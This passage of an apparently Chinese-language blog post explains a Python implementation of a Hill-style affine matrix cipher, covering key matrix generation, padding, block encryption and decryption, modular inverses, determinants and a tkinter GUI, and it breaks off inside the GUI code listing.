<li>对输入的密钥A作为矩阵A，求出矩阵A的逆矩阵</li>
<li>对密文进行分组</li>
<li>通过<code>Mi≡A−1(Ci−B)(mod 26)</code>解密变换求出明文</li>
</ul>
<h2 id="软件系统设计"><a href="#软件系统设计" class="headerlink" title="软件系统设计"></a>软件系统设计</h2><h3 id="随机生成矩阵"><a href="#随机生成矩阵" class="headerlink" title="随机生成矩阵"></a>随机生成矩阵</h3><p>此部分主要介绍如何随机生成可逆矩阵A和矩阵B作为密钥A和密钥B，同时实现将密钥作为文件保存</p>
<h4 id="可逆矩阵A"><a href="#可逆矩阵A" class="headerlink" title="可逆矩阵A"></a>可逆矩阵A</h4><blockquote>
<p>生成可逆矩阵A的主要方法为：用单位矩阵进行初等变换而成</p>
</blockquote>
<h5 id="生成单位矩阵"><a href="#生成单位矩阵" class="headerlink" title="生成单位矩阵"></a>生成单位矩阵</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getIdentityMatrix</span><span class="params">(n)</span>:</span><span class="comment">#生成单位矩阵</span></span><br><span class="line">    A = np.zeros((n,n))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                A[i][j] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                A[i][j] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> A</span><br></pre></td></tr></table></figure>

<p>这没有什么可以讲的很简单</p>
<h5 id="生成随机可逆矩阵A"><a href="#生成随机可逆矩阵A" class="headerlink" title="生成随机可逆矩阵A"></a>生成随机可逆矩阵A</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getInvertibleMatrix</span><span class="params">(n,m)</span>:</span><span class="comment">#生成可逆矩阵</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        A = getIdentityMatrix(n)</span><br><span class="line">        tempArray = np.zeros(n)</span><br><span class="line">        B = np.zeros((n,n))</span><br><span class="line">        transformTime = int(random.randint(<span class="number">0</span>,<span class="number">1000</span>))</span><br><span class="line">        maxint = sys.maxsize</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(transformTime):</span><br><span class="line">            mainRowNum = int((random.randint(<span class="number">0</span>,n) % (n - <span class="number">1</span>)))<span class="comment">#选择一个主行作初等行变换</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(n):</span><br><span class="line">                <span class="comment">#元素数值是否会溢出</span></span><br><span class="line">                <span class="keyword">if</span> maxint - (A[mainRowNum][k])*(int(random.randint(<span class="number">0</span>,<span class="number">10</span>))) &lt; <span class="number">0</span> <span class="keyword">and</span> maxint*(<span class="number">-1</span>) - (A[mainRowNum][k])*(int(random.randint(<span class="number">0</span>,<span class="number">10</span>))) &gt; tempArray[k]:</span><br><span class="line">                    tempArray[k] = A[mainRowNum][k]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    tempArray[k] = (A[mainRowNum][k]*(int(random.randint(<span class="number">0</span>,<span class="number">10</span>))))%m</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">                <span class="keyword">if</span> mainRowNum != j:</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> range(n):</span><br><span class="line">                        <span class="keyword">if</span> maxint - A[j][k]&lt; tempArray[k] <span class="keyword">and</span> maxint * (<span class="number">-1</span>) - (A[j][k]) &gt; tempArray[k]:</span><br><span class="line">                            A[j][k] = (A[j][k]/<span class="number">4</span>)%m</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            A[j][k] = (A[j][k] + tempArray[k])%m</span><br><span class="line">        <span class="keyword">if</span> gcd(np.linalg.det(A),m) == <span class="number">1</span> <span class="keyword">and</span> np.linalg.det(A) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> A</span><br></pre></td></tr></table></figure>

<p>其中<code>transformTime</code>为随机决定初等行变换的次数，关键是要确保<strong>矩阵A的行列式与所定模N互素</strong></p>
<p>故需要此限定的条件：<code>gcd(np.linalg.det(A),m) == 1 and np.linalg.det(A)</code></p>
<h4 id="矩阵B"><a href="#矩阵B" class="headerlink" title="矩阵B"></a>矩阵B</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">B = np.zeros((n, <span class="number">1</span>))</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">	B[row] = int(random.randint(<span class="number">0</span>, <span class="number">26</span>))</span><br></pre></td></tr></table></figure>

<p>这没有什么可以讲的很简单</p>
<h3 id="明文分组加密"><a href="#明文分组加密" class="headerlink" title="明文分组加密"></a>明文分组加密</h3><h4 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h4><h5 id="记录空格和符号"><a href="#记录空格和符号" class="headerlink" title="记录空格和符号"></a>记录空格和符号</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">klist = np.zeros(len(clear))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line">            <span class="keyword">if</span> clear[i] == <span class="string">' '</span>:</span><br><span class="line">                klist[index] = int(i)</span><br><span class="line">                index = index + <span class="number">1</span></span><br><span class="line">dlist = np.zeros(len(clear))</span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line">				<span class="keyword">if</span> clear[i] == <span class="string">','</span>:</span><br><span class="line">        		dlist[index] = int(i)</span><br><span class="line">            index = index + <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h5 id="字符串初始化转换为纯字母序列"><a href="#字符串初始化转换为纯字母序列" class="headerlink" title="字符串初始化转换为纯字母序列"></a>字符串初始化转换为纯字母序列</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line">        <span class="keyword">if</span> clear[i] == <span class="string">','</span>:</span><br><span class="line">            clear[i] = <span class="string">' '</span></span><br><span class="line">    <span class="keyword">while</span> <span class="string">' '</span> <span class="keyword">in</span> clear:</span><br><span class="line">        clear.remove(<span class="string">' '</span>)</span><br></pre></td></tr></table></figure>

<h4 id="补位操作"><a href="#补位操作" class="headerlink" title="补位操作"></a>补位操作</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lenth % n == <span class="number">0</span>):</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        offset = n - lenth % n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):</span><br><span class="line">        CipherText.append(<span class="string">'A'</span>)</span><br><span class="line">    groups = int(len(CipherText) / n)</span><br></pre></td></tr></table></figure>

<h4 id="生成M序列"><a href="#生成M序列" class="headerlink" title="生成M序列"></a>生成M序列</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">M = np.zeros((groups, n))</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(groups):</span><br><span class="line">        <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">            M[row][column] = CipherText[index]</span><br><span class="line">            index = index + <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h4 id="分组加密"><a href="#分组加密" class="headerlink" title="分组加密"></a>分组加密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(groups):<span class="comment">#实现矩阵乘法和矩阵加法，InA*(C-B)</span></span><br><span class="line">       tmp = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">       tmpp = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">       <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#初始化Mi</span></span><br><span class="line">           tmp[row][<span class="number">0</span>] = M[i][row]</span><br><span class="line">       <span class="keyword">for</span> row <span class="keyword">in</span> range(n):  <span class="comment"># 实现C-B</span></span><br><span class="line">           tmp[row][<span class="number">0</span>] = tmp[row][<span class="number">0</span>] - B[row][<span class="number">0</span>]</span><br><span class="line">       <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#实现InA*(C-B)mod(N)</span></span><br><span class="line">           <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">               tmpp[row][<span class="number">0</span>] = int(tmpp[row][<span class="number">0</span>] + (int(tmp[column][<span class="number">0</span>]) * int(A[row][column])))</span><br><span class="line">           tmpp[row][<span class="number">0</span>] = int((tmpp[row][<span class="number">0</span>]) % N)</span><br><span class="line">       <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">           clearlist.append(NtoA(int(tmpp[row][<span class="number">0</span>])))</span><br></pre></td></tr></table></figure>

<h4 id="消除补位影响"><a href="#消除补位影响" class="headerlink" title="消除补位影响"></a>消除补位影响</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):<span class="comment">#消除补位影响</span></span><br><span class="line">            <span class="keyword">del</span> clearlist[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>

<h3 id="逆矩阵"><a href="#逆矩阵" class="headerlink" title="逆矩阵"></a>逆矩阵</h3><h5 id="逆元"><a href="#逆元" class="headerlink" title="逆元"></a>逆元</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">InverseElement</span><span class="params">(b,p)</span>:</span><span class="comment">#求逆元</span></span><br><span class="line">    inv = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> (inv*b)%p == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        inv = inv +<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> inv</span><br></pre></td></tr></table></figure>

<h5 id="行列式"><a href="#行列式" class="headerlink" title="行列式"></a>行列式</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Det</span><span class="params">(a,n)</span>:</span><span class="comment">#求行列式</span></span><br><span class="line">    b = np.zeros((n, n))<span class="comment">#临时数组用于降阶</span></span><br><span class="line">    sum = int(<span class="number">0</span>)</span><br><span class="line">    sign = int(<span class="number">0</span>)</span><br><span class="line">    p = int(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):<span class="comment">#此处大循环实现将余子式存入数组b中</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">                <span class="keyword">if</span> c&lt;i:</span><br><span class="line">                    p = <span class="number">0</span><span class="comment">#当p=0时，行列式只向左移，即消去对应的第一列的数</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    p = <span class="number">1</span><span class="comment">#否则行列式左移后再上移</span></span><br><span class="line">                b[c][j]=a[c+p][j+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            sign = <span class="number">1</span><span class="comment">#i为偶数，加法</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sign = <span class="number">-1</span><span class="comment">#i为奇数，减法</span></span><br><span class="line">        sum = sum + a[i][<span class="number">0</span>]*Det(b,n<span class="number">-1</span>)*sign<span class="comment">#计算行列式的值</span></span><br><span class="line">    <span class="keyword">return</span>  sum</span><br></pre></td></tr></table></figure>

<h5 id="伴随矩阵"><a href="#伴随矩阵" class="headerlink" title="伴随矩阵"></a>伴随矩阵</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAStart</span><span class="params">(arcs,n,ans)</span>:</span><span class="comment">#计算每一行每一列的每个元素所对应的余子式，组成A*</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        ans[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    temp = np.zeros((n, n))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">                    temp[k][t] = arcs[(k+<span class="number">1</span> <span class="keyword">if</span> k&gt;=i <span class="keyword">else</span> k)][(t+<span class="number">1</span> <span class="keyword">if</span> t&gt;=j <span class="keyword">else</span> t)]</span><br><span class="line">                ans[j][i] = Det(temp,n<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">if</span> (i+j)%<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                    ans[j][i] = -ans[j][i]</span><br></pre></td></tr></table></figure>

<h5 id="逆矩阵-1"><a href="#逆矩阵-1" class="headerlink" title="逆矩阵"></a>逆矩阵</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">InverseMat</span><span class="params">(a,n,p,ans)</span>:</span></span><br><span class="line">    astar = np.zeros((n, n))</span><br><span class="line">    getAStart(a, n, astar)<span class="comment">#求A的伴随矩阵</span></span><br><span class="line">    deta = int(Det(a,n))<span class="comment">#求A的行列式</span></span><br><span class="line">    <span class="keyword">if</span> deta &lt; <span class="number">0</span>:</span><br><span class="line">        deta = deta + p</span><br><span class="line">    inv = int(InverseElement(deta,p))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            ans[i][j] = astar[i][j]*inv</span><br><span class="line">            ans[i][j] = ans[i][j]%p</span><br><span class="line">            <span class="keyword">if</span> ans[i][j] &lt;<span class="number">0</span>:</span><br><span class="line">                ans[i][j] = ans[i][j] + p</span><br></pre></td></tr></table></figure>

<h3 id="密文分组解密"><a href="#密文分组解密" class="headerlink" title="密文分组解密"></a>密文分组解密</h3><h5 id="补位操作-1"><a href="#补位操作-1" class="headerlink" title="补位操作"></a>补位操作</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lenth % n == <span class="number">0</span>):</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        offset = n - lenth % n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):</span><br><span class="line">        CipherText.append(<span class="string">'A'</span>)</span><br><span class="line">    groups = int(len(CipherText) / n)</span><br></pre></td></tr></table></figure>

<h5 id="生成M序列-1"><a href="#生成M序列-1" class="headerlink" title="生成M序列"></a>生成M序列</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">M = np.zeros((groups, n))</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(groups):</span><br><span class="line">        <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">            M[row][column] = CipherText[index]</span><br><span class="line">            index = index + <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h5 id="分组解密"><a href="#分组解密" class="headerlink" title="分组解密"></a>分组解密</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(groups):<span class="comment">#实现矩阵乘法和矩阵加法，InA*(C-B)</span></span><br><span class="line">        tmp = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">        tmpp = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#初始化Mi</span></span><br><span class="line">            tmp[row][<span class="number">0</span>] = M[i][row]</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):  <span class="comment"># 实现C-B</span></span><br><span class="line">            tmp[row][<span class="number">0</span>] = tmp[row][<span class="number">0</span>] - B[row][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#实现InA*(C-B)mod(N)</span></span><br><span class="line">            <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">                tmpp[row][<span class="number">0</span>] = int(tmpp[row][<span class="number">0</span>] + (int(tmp[column][<span class="number">0</span>]) * int(A[row][column])))</span><br><span class="line">            tmpp[row][<span class="number">0</span>] = int((tmpp[row][<span class="number">0</span>]) % N)</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">            clearlist.append(NtoA(int(tmpp[row][<span class="number">0</span>])))</span><br></pre></td></tr></table></figure>

<h5 id="消除补位影响-1"><a href="#消除补位影响-1" class="headerlink" title="消除补位影响"></a>消除补位影响</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):<span class="comment">#消除补位影响</span></span><br><span class="line">            <span class="keyword">del</span> clearlist[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>

<h3 id="GUI图形界面最终实现"><a href="#GUI图形界面最终实现" class="headerlink" title="GUI图形界面最终实现"></a>GUI图形界面最终实现</h3><p>GUI的实现使用的<strong>Python</strong>自带的<strong>tkinter</strong>库,实现了错误提示框的弹出和各类操作可视化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span 